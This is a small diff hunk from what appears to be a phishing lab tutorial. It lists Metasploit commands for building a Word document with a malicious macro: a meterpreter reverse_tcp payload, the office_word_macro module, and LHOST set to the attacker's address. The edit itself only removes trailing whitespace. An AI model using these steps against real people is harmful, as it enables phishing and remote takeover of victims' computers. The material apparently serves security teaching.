@@ -9,7 +9,7 @@ One might get an email out of nowhere claiming that they are being charged a hef
 You will use the Metasploit Framework to create the document with the malicious macro. This requires the following commands:
 
 - Open a new terminal window and run `msfconsole` to start the Metasploit Framework
-- `set payload windows/meterpreter/reverse_tcp` specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell  
+- `set payload windows/meterpreter/reverse_tcp` specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell
 
 - `use exploit/multi/fileformat/office_word_macro` specifies the exploit you want to use. Technically speaking, this is not an exploit; it is a module to create a document with a macro
 - `set LHOST <IP>` specifies the IP address of the attacker’s system.
